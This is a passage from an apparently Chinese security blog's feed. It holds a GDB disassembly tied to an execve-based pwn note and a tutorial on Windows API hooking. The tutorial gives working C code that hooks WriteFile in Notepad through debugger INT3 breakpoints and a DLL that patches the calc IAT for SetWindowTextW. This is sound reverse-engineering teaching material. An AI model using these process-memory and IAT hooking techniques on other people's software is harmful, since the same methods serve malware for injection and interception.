class="number">0x0804841d</span> &lt;+<span class="number">23</span>&gt;:add    eax,<span class="number">0x1be3</span></div><div class="line">   <span class="number">0x08048422</span> &lt;+<span class="number">28</span>&gt;:lea    edx,[eax<span class="number">-0x1b20</span>]</div><div class="line">   <span class="number">0x08048428</span> &lt;+<span class="number">34</span>&gt;:mov    DWORD PTR [ebp<span class="number">-0x10</span>],edx</div><div class="line">   <span class="number">0x0804842b</span> &lt;+<span class="number">37</span>&gt;:mov    DWORD PTR [ebp<span class="number">-0xc</span>],<span class="number">0x0</span></div><div class="line">   <span class="number">0x08048432</span> &lt;+<span class="number">44</span>&gt;:mov    edx,DWORD PTR [ebp<span class="number">-0x10</span>]</div><div class="line">   <span class="number">0x08048435</span> &lt;+<span class="number">47</span>&gt;:sub    esp,<span class="number">0x4</span></div><div class="line">   <span class="number">0x08048438</span> &lt;+<span class="number">50</span>&gt;:push   <span class="number">0x0</span></div><div class="line">   <span class="number">0x0804843a</span> &lt;+<span class="number">52</span>&gt;:lea    ecx,[ebp<span class="number">-0x10</span>]</div><div class="line">   <span class="number">0x0804843d</span> &lt;+<span class="number">55</span>&gt;:push   ecx</div><div class="line">   <span class="number">0x0804843e</span> &lt;+<span class="number">56</span>&gt;:push   edx</div><div class="line">   <span class="number">0x0804843f</span> &lt;+<span class="number">57</span>&gt;:mov    ebx,eax</div><div class="line">   <span class="number">0x08048441</span> &lt;+<span class="number">59</span>&gt;:call   <span class="number">0x80482f0</span> &lt;execve@plt&gt;</div><div class="line">   <span class="number">0x08048446</span> &lt;+<span class="number">64</span>&gt;:add    esp,<span class="number">0x10</span></div><div class="line">   <span class="number">0x08048449</span> &lt;+<span class="number">67</span>&gt;:mov    eax,<span class="number">0x0</span></div><div class="line">   <span class="number">0x0804844e</span> &lt;+<span class="number">72</span>&gt;:lea    esp,[ebp<span class="number">-0x8</span>]</div><div class="line">   <span class="number">0x08048451</span> &lt;+<span class="number">75</span>&gt;:pop    ecx</div><div class="line">   <span class="number">0x08048452</span> &lt;+<span class="number">76</span>&gt;:pop    ebx</div><div class="line">   <span class="number">0x08048453</span> &lt;+<span class="number">77</span>&gt;:pop    ebp</div><div class="line">   <span class="number">0x08048454</span> &lt;+<span class="number">78</span>&gt;:lea    esp,[ecx<span class="number">-0x4</span>]</div><div class="line">   <span class="number">0x08048457</span> &lt;+<span class="number">81</span>&gt;:ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure><h2 id="研究-execve-函数的执行过程"><a href="#研究-execve-函数的执行过程" class="headerlink" title="研究 execve() 函数的执行过程"></a>研究 execve() 函数的执行过程</h2><h2 id="研究-exit-函数的执行过程"><a href="#研究-exit-函数的执行过程" class="headerlink" title="研究 exit() 函数的执行过程"></a>研究 exit() 函数的执行过程</h2><h2 id="文学修养"><a href="#文学修养" class="headerlink" title="文学修养"></a>文学修养</h2><p>无边落木萧萧下，不尽长江滚滚来。<br>万里悲秋常作客，百年多病独登台。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwn题必备的套路&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>RE——Hook</title>
    <link href="http://yoursite.com/2018/05/09/re_hook/"/>
    <id>http://yoursite.com/2018/05/09/re_hook/</id>
    <published>2018-05-09T03:52:41.268Z</published>
    <updated>2018-05-02T02:41:53.591Z</updated>
    
    <content type="html"><![CDATA[<p>逆向分析之”花”。windows的Hook是程序设计中最为灵活多变的技巧之一。Hook有两种含义:1、系统提供的消息Hook机制;2、自定义的Hook编程技巧，<br><a id="more"></a><br>Hook（钩子）是WINDOWS提供的一种消息处理机制平台，是指在程序正常运<br>行中接受信息之前预先启动的函数，用来检查和修改传给该程序的信息，（钩子）实<br>际上是一个处理消息的程序段，通过系统调用，把它挂入系统。每当特定的消息发出，<br>在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。</p><h1 id="钩取方式"><a href="#钩取方式" class="headerlink" title="钩取方式"></a>钩取方式</h1><p>如图，一般有三种API钩取方式：<br><img src="https://i.imgur.com/UaTkYDc.png" alt=""><br>下面都以Notepad.exe的WriteFile() API为例钩取</p><h1 id="方式1——动态-进程内存"><a href="#方式1——动态-进程内存" class="headerlink" title="方式1——动态-进程内存"></a>方式1——动态-进程内存</h1><p>直接在API加载时调用钩取<br>动态-进程内存-代码-调试技术<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"></div><div class="line">LPVOID g_pfWriteFile = <span class="literal">NULL</span>;  <span class="comment">//writefile函数的地址</span></div><div class="line">CREATE_PROCESS_DEBUG_INFO g_cpdi; <span class="comment">//存放调试信息</span></div><div class="line">BYTE g_chINT3 = <span class="number">0xCC</span>, g_chOrgByte = <span class="number">0</span>;<span class="comment">//0xCC是int 3的机器码</span></div><div class="line"></div><div class="line"><span class="comment">//当创建进程调试事件时运行此</span></div><div class="line"><span class="function">BOOL <span class="title">OnCreateProcessDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">// WriteFile() API Address 获取地址</span></div><div class="line">g_pfWriteFile = GetProcAddress(GetModuleHandleA(<span class="string">"kernel32.dll"</span>), <span class="string">"WriteFile"</span>);</div><div class="line"></div><div class="line"><span class="comment">// API Hook - WriteFile()</span></div><div class="line"><span class="comment">//不知道？？？</span></div><div class="line"><span class="built_in">memcpy</span>(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, <span class="keyword">sizeof</span>(CREATE_PROCESS_DEBUG_INFO));</div><div class="line"><span class="comment">//这里读出 WriteFile()的首地址并备份在g_chOrgByte，后面脱钩会用到</span></div><div class="line">ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chOrgByte, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"><span class="comment">//将0xCC(INT 3) 写入WriteFile() API Address的第一个字节</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chINT3, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//当异常发生时，也就是 WriteFile()函数执行结束</span></div><div class="line"><span class="function">BOOL <span class="title">OnExceptionDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">CONTEXT ctx;   <span class="comment">//记录hook的上下文</span></div><div class="line">PBYTE lpBuffer = <span class="literal">NULL</span>;<span class="comment">//用于临时缓冲区</span></div><div class="line">DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i;</div><div class="line">PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord;</div><div class="line"></div><div class="line"><span class="comment">// BreakPoint exception (INT 3) 当断点是3时，这样就一定会先执行OnCreateProcessDebugEvent</span></div><div class="line"><span class="keyword">if</span> (EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode)</div><div class="line">&#123;</div><div class="line"><span class="comment">// BP Address == WriteFile() Address </span></div><div class="line"><span class="keyword">if</span> (g_pfWriteFile == per-&gt;ExceptionAddress)</div><div class="line">&#123;</div><div class="line"><span class="comment">// #1. Unhook 恢复 WriteFile()的首地址的值，也就是改为刚才备份g_chOrgByte</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chOrgByte, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="comment">// #2. Thread Context 获取线程的上下文</span></div><div class="line">ctx.ContextFlags = CONTEXT_CONTROL;</div><div class="line">GetThreadContext(g_cpdi.hThread, &amp;ctx);</div><div class="line"></div><div class="line"><span class="comment">// #3. WriteFile() 函数参数param 2, 3 的值</span></div><div class="line"><span class="comment">//   param 2 : ESP + 0x8 (这里是32位)</span></div><div class="line"><span class="comment">//   param 3 : ESP + 0xC</span></div><div class="line">ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0x8</span>),&amp;dwAddrOfBuffer, <span class="keyword">sizeof</span>(DWORD), <span class="literal">NULL</span>);</div><div class="line">ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0xC</span>),&amp;dwNumOfBytesToWrite, <span class="keyword">sizeof</span>(DWORD), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="comment">// #4. 分配临时缓冲区</span></div><div class="line">lpBuffer = (PBYTE)<span class="built_in">malloc</span>(dwNumOfBytesToWrite + <span class="number">1</span>);</div><div class="line"><span class="built_in">memset</span>(lpBuffer, <span class="number">0</span>, dwNumOfBytesToWrite + <span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="comment">// #5. WriteFile() 的输入 复制 缓冲区</span></div><div class="line">ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer,lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\n### original string ###\n%s\n"</span>, lpBuffer);</div><div class="line"></div><div class="line"><span class="comment">// #6. 将小写转换成大写</span></div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwNumOfBytesToWrite; i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (<span class="number">0x61</span> &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= <span class="number">0x7A</span>)</div><div class="line">lpBuffer[i] -= <span class="number">0x20</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"\n### converted string ###\n%s\n"</span>, lpBuffer);</div><div class="line"></div><div class="line"><span class="comment">// #7. 将变换后缓冲区 的数据写入WriteFile()函数的缓冲区</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer,lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="comment">// #8. 释放缓冲区</span></div><div class="line"><span class="built_in">free</span>(lpBuffer);</div><div class="line"></div><div class="line"><span class="comment">// #9. 将上下文的EIP更改为 WriteFile()的首地址</span></div><div class="line">ctx.Eip = (DWORD)g_pfWriteFile;</div><div class="line">SetThreadContext(g_cpdi.hThread, &amp;ctx);</div><div class="line"></div><div class="line"><span class="comment">// #10. 运行被调试的进程</span></div><div class="line">ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);</div><div class="line"></div><div class="line"><span class="comment">//释放当前的时间片，即放弃当前线程执行的CPU的时间片</span></div><div class="line">Sleep(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">// #11. API Hook</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chINT3, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">DebugLoop</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">DEBUG_EVENT de;</div><div class="line">DWORD dwContinueStatus;</div><div class="line"></div><div class="line"><span class="comment">// Waiting Debuggee event 等待调试事件的发生 ，循环调试</span></div><div class="line"><span class="keyword">while</span> (WaitForDebugEvent(&amp;de, INFINITE))</div><div class="line">&#123;</div><div class="line">dwContinueStatus = DBG_CONTINUE;</div><div class="line"></div><div class="line"><span class="comment">// Debuggee  attach 属于SEH异常一种</span></div><div class="line"><span class="keyword">if</span> (CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode)</div><div class="line">&#123;</div><div class="line">OnCreateProcessDebugEvent(&amp;de);  <span class="comment">//跳到下一个函数</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 异常事件  属于SEH异常一种</span></div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode)</div><div class="line">&#123;</div><div class="line"><span class="comment">//跳到下一个函数</span></div><div class="line"><span class="keyword">if</span> (OnExceptionDebugEvent(&amp;de))</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// Debuggee exit,被调试事件终止  属于SEH异常一种</span></div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode)</div><div class="line">&#123;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Debuggee continue.再次调试事件</span></div><div class="line">ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">DWORD dwPID;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\nUSAGE : hook.exe &lt;pid&gt;\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Attach Process 开始调试</span></div><div class="line">dwPID = atoi(argv[<span class="number">1</span>]);</div><div class="line"><span class="keyword">if</span> (!DebugActiveProcess(dwPID))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"DebugActiveProcess(%d) failed!!!\n"</span></div><div class="line"><span class="string">"Error Code = %d\n"</span>, dwPID, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//循环调试</span></div><div class="line">DebugLoop();  <span class="comment">//跳到下一个函数</span></div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>若在生成exe文件是出现这个错误“GetModuleHandleW”: 不能将参数 1 从“const char [10]”转换为“LPCWSTR” 解决方法:<br>项目菜单-&gt;属性-&gt;配置属性-&gt;常规-&gt;项目默认值-&gt;字符集改为未设置</p><p>生成hook.exe 额，在调试的时候，运行hook.exe pid后发现nopad卡住啦，尴尬,怀疑可能是要在32位的系统下，然后又在32位的系统下运行，发现并不是系统问题。又怀疑是不是编译的时候开啦ALSR啦，关掉ALSR，还是不行，得看看代码啦。原来是代码错啦，这。。。。</p><p>运行结果:<br><img src="https://i.imgur.com/AX5bTLh.png" alt=""><br>总结: 这是代码动态注入，通过附件进程，触发异常，通过异常获取WriteFile()函数的信息，在WriteFile()函数首地址下断点，然后截取控制流程，再次触发异常，恢复WriteFile()函数首地址，并且获取线程的上下文，然后将WriteFile()函数读取的缓冲区读出，然后转换成目标数据后写入WriteFile()函数的缓冲区，恢复线程上下文，继续运行就可以hook成功啦。 </p><h1 id="方式2——IAT钩取"><a href="#方式2——IAT钩取" class="headerlink" title="方式2——IAT钩取"></a>方式2——IAT钩取</h1><p>IAT的hook原理:在保持运行代码不变的前提下，将IAT中保存的API起始地址变为用户的起始地址。如图:<br>钩取前<br><img src="https://i.imgur.com/LCmH9DI.png" alt=""><br>钩取后<br><img src="https://i.imgur.com/2dd7nvJ.png" alt=""></p><p>下面以计算器为例，讲解IAT的dll的hook.<br>hookiat.dll的hookiat.cpp<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wchar.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI *PFSETWINDOWTEXTW)</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span>;</div><div class="line">FARPROC g_pOrgFunc = <span class="literal">NULL</span>;</div><div class="line"><span class="function">BOOL WINAPI <span class="title">MySetWindowTextW</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">wchar_t</span>* pNum = <span class="string">L"零一二三四五六七八九"</span>;</div><div class="line">    <span class="keyword">wchar_t</span> temp[<span class="number">2</span>] = &#123;<span class="number">0</span>,&#125;;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, nLen = <span class="number">0</span>, nIndex = <span class="number">0</span>;</div><div class="line"></div><div class="line">    nLen = wcslen(lpString);</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nLen; i++)</div><div class="line">    &#123;</div><div class="line">        <span class="comment">// 将阿拉伯数字转化成中文</span></div><div class="line">        <span class="comment">//  lpString缓冲区 中文的字宽是的2字节</span></div><div class="line">        if( L'0' &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L'9' )</div><div class="line">        &#123;</div><div class="line">            temp[<span class="number">0</span>] = lpString[i];</div><div class="line">            nIndex = _wtoi(temp);</div><div class="line">            lpString[i] = pNum[nIndex];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 调用user32!SetWindowTextW() API</span></div><div class="line">    <span class="comment">//  修改lpString缓冲区的数据</span></div><div class="line">    <span class="keyword">return</span> ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// hook_iat</span></div><div class="line"><span class="function">BOOL <span class="title">hook_iat</span><span class="params">(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">HMODULE hMod; <span class="comment">//hMod=ImageBase 基址</span></div><div class="line">LPCSTR szLibName; </div><div class="line">PIMAGE_IMPORT_DESCRIPTOR pImportDesc; </div><div class="line">PIMAGE_THUNK_DATA pThunk; </div><div class="line">DWORD dwOldProtect, dwRVA; </div><div class="line">PBYTE pAddr; </div><div class="line"></div><div class="line">hMod = GetModuleHandle(<span class="literal">NULL</span>); <span class="comment">//hMod= ImageBase of calc.exe 基址</span></div><div class="line">pAddr = (PBYTE)hMod;  </div><div class="line">pAddr += *((DWORD*)&amp;pAddr[<span class="number">0x3C</span>]); <span class="comment">// pAddr = VA to PE signature (IMAGE_NT_HEADERS)</span></div><div class="line">dwRVA = *((DWORD*)&amp;pAddr[<span class="number">0x80</span>]);  <span class="comment">// dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table</span></div><div class="line">pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA); <span class="comment">// pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table</span></div><div class="line"><span class="comment">//上面几行代码首先从ImageBase开始，经由PE签名找到IDT,plmportDesc中存储着IID(IMAGE_IMPORT_DESCRIPTOR)结构体的起始地址,IDT是由IID组成的数组，要找的IAT，先要查找到这个位置，而在本例中，pImportDesc=0x1012B80，可以用PEview看见。但是这里为什么是80？？？，而我们要找user32.dll,它在下面，所以遍历查找</span></div><div class="line"><span class="keyword">for</span>( ; pImportDesc-&gt;Name; pImportDesc++ )</div><div class="line">&#123;     </div><div class="line">szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name); <span class="comment">//获取user32.dll的库名</span></div><div class="line"><span class="keyword">if</span>( !_stricmp(szLibName, szDllName) )  <span class="comment">// 查找要的user32.dll</span></div><div class="line">&#123;</div><div class="line"><span class="comment">//得到user32.dll库的IAT地址 ，接着在IAT查找需要的函数user32!SetWindowTextW()</span></div><div class="line">pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc-&gt;FirstThunk);</div><div class="line"><span class="keyword">for</span>( ; pThunk-&gt;u1.Function; pThunk++ )</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>( pThunk-&gt;u1.Function == (DWORD)pfnOrg ) <span class="comment">//如果找到user32!SetWindowTextW()</span></div><div class="line">&#123;</div><div class="line">                  </div><div class="line">VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);       </div><div class="line">                    pThunk-&gt;u1.Function = (DWORD)pfnNew;</div><div class="line">                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">4</span>, dwOldProtect, &amp;dwOldProtect);</div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//dll主函数</span></div><div class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">switch</span>( fdwReason )</div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH : </div><div class="line">            <span class="comment">//保存API原地址 </span></div><div class="line">           g_pOrgFunc = GetProcAddress(GetModuleHandle(<span class="string">L"user32.dll"</span>), <span class="string">"SetWindowTextW"</span>);</div><div class="line"></div><div class="line">            <span class="comment">// # hook 钩取</span></div><div class="line">            <span class="comment">//   hookiat!MySetWindowText()钩取user32!SetWindowTextW()</span></div><div class="line">hook_iat(<span class="string">"user32.dll"</span>, g_pOrgFunc, (PROC)MySetWindowTextW);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH :</div><div class="line">            <span class="comment">// # unhook 脱钩</span></div><div class="line">            <span class="comment">//   calc.exe 的IAT 恢复</span></div><div class="line">            hook_iat(<span class="string">"user32.dll"</span>, (PROC)MySetWindowTextW, g_pOrgFunc);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>我们再看看hookd.exe的cpp<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div></pre></td><td 